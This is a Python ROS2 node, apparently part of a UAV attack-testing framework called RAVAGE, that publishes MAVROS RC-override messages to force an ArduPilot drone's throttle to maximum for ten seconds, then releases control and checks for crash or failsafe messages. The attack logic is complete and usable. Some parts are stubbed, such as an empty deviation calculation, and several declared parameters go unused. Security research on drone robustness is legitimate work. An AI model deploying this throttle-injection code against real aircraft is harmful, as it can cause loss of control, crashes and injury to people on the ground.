import rclpy
from rclpy.node import Node
from rclpy.callback_groups import ReentrantCallbackGroup
import threading
import time
import math
import yaml
import os

# ROS2 messages
from mavros_msgs.msg import StatusText, WaypointList, OverrideRCIn
from mavros_msgs.srv import ParamSet, ParamGet
from sensor_msgs.msg import NavSatFix
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy

class RavageNode(Node):
    def __init__(self):
        super().__init__('ravage_attack_engine')

        # Parameters
        self.declare_parameter('intensity', 0.0)
        self.declare_parameter('duration', 60.0)
        self.declare_parameter('attack_type', 'GPS')
        self.declare_parameter('software', 'ArduPilot')
        self.declare_parameter('config_path', './config')

        self.intensity = self.get_parameter('intensity').value
        self.duration = self.get_parameter('duration').value
        self.attack_type = self.get_parameter('attack_type').value.upper()
        self.software = self.get_parameter('software').value
        self.config_path = self.get_parameter('config_path').value

        # State variables
        self.current_lat = 0.0
        self.current_lon = 0.0
        self.current_alt = 0.0
        self.waypoints = []
        self.current_wp_index = 0
        self.max_path_deviation = 0.0
        self.crash_detected = False
        self.failsafe_triggered = False

        # Load configs
        self.load_configs()

        qos_reliable = QoSProfile(
            reliability=ReliabilityPolicy.RELIABLE,
            history=HistoryPolicy.KEEP_LAST,
            depth=10
        )

        qos_best_effort = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            depth=10
        )

        # Thread-safe callback group
        self.cb_group = ReentrantCallbackGroup()

        # Subscriptions
        self.sub_status = self.create_subscription(
            StatusText, '/mavros/statustext/recv', self.status_cb, qos_best_effort, callback_group=self.cb_group)
        self.sub_pos = self.create_subscription(
            NavSatFix, '/mavros/global_position/global', self.pos_cb, qos_best_effort, callback_group=self.cb_group)
        self.sub_mission = self.create_subscription(
            WaypointList, '/mavros/mission/waypoints', self.mission_cb, qos_best_effort, callback_group=self.cb_group)

        # Services
        self.param_set_client = self.create_client(ParamSet, '/mavros/param/set', callback_group=self.cb_group)
        self.param_get_client = self.create_client(ParamGet, '/mavros/param/get', callback_group=self.cb_group)

        # Publisher for RC Override
        self.rc_pub = self.create_publisher(OverrideRCIn, '/mavros/rc/override', qos_reliable)

        self.get_logger().info(f"RAVAGE Node Initialized. Target: {self.software}, Attack: {self.attack_type}")

        # Start attack thread
        self.attack_thread = threading.Thread(target=self.run_attack_sequence)
        self.attack_thread.daemon = True # Ensure thread dies when node dies

    def load_configs(self):
        try:
            # Basic error handling for missing files
            if not os.path.exists(self.config_path):
                self.get_logger().warn(f"Config path {self.config_path} does not exist. Skipping load.")
                return

            p_conf = os.path.join(self.config_path, 'param_config.yaml')
            a_conf = os.path.join(self.config_path, 'attack_profile.yaml')

            if os.path.exists(p_conf):
                with open(p_conf, 'r') as f:
                    self.param_config = yaml.safe_load(f)
            if os.path.exists(a_conf):
                with open(a_conf, 'r') as f:
                    self.sensor_config = yaml.safe_load(f)
        except Exception as e:
            self.get_logger().error(f"Failed to load config: {e}")

    # --- Callbacks ---
    def status_cb(self, msg):
        text = msg.text.lower()
        self.get_logger().info(f"[MAVROS Status] {msg.text}")
        if "crash" in text or "ground" in text:
            self.crash_detected = True
        if "failsafe" in text:
            self.failsafe_triggered = True

    def pos_cb(self, msg):
        self.current_lat = msg.latitude
        self.current_lon = msg.longitude
        self.current_alt = msg.altitude
        self.calculate_deviation()

    def mission_cb(self, msg):
        self.waypoints = msg.waypoints
        self.current_wp_index = msg.current_seq

    # --- Attack Logic ---
    def run_attack_sequence(self):
        """Injects RC Override to maximize throttle"""
        time.sleep(2.0) # Wait for connections
        self.get_logger().info("ATTACK STARTED: Overriding Throttle to MAX (Channel 3)")

        msg = OverrideRCIn()
        # 65535 (UINT16_MAX) means "ignore this channel / pass-through"
        msg.channels = [65535] * 18 

        start_time = time.time()
        
        # ATTACK LOOP
        while (time.time() - start_time < 10.0) and rclpy.ok():
            # ArduPilot Channel Mapping (Standard):
            # 0: Roll, 1: Pitch, 2: Throttle, 3: Yaw
            # Set Throttle to 2000 PWM (Max)
            msg.channels[2] = 2000 
            
            self.rc_pub.publish(msg)
            # Log periodically to avoid spamming
            if int(time.time() * 10) % 10 == 0:
                self.get_logger().info("Injecting: Max Throttle")
            
            time.sleep(0.05) # 20Hz update rate for smooth RC override

        # RECOVERY
        self.get_logger().info("Attack stopping... Releasing control.")
        
        # Send a "Release" command. 
        # 0 usually forces 0 PWM (which is bad), 65535 releases to the pilot.
        msg.channels = [65535] * 18
        
        # Publish release command multiple times to ensure receipt (UDP nature of MAVLink)
        for _ in range(5):
            self.rc_pub.publish(msg)
            time.sleep(0.05)

        self.get_logger().info("Control returned to Pilot.")
        self.log_attack_result()

    def calculate_deviation(self):
        # (Same math logic as your original snippet)
        pass 

    def log_attack_result(self):
        self.get_logger().info(f"Final Report: Max Deviation {self.max_path_deviation}")

def main(args=None):
    rclpy.init(args=args)
    node = RavageNode()
    
    node.attack_thread.start()
    
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()

if __name__ == '__main__':
    main()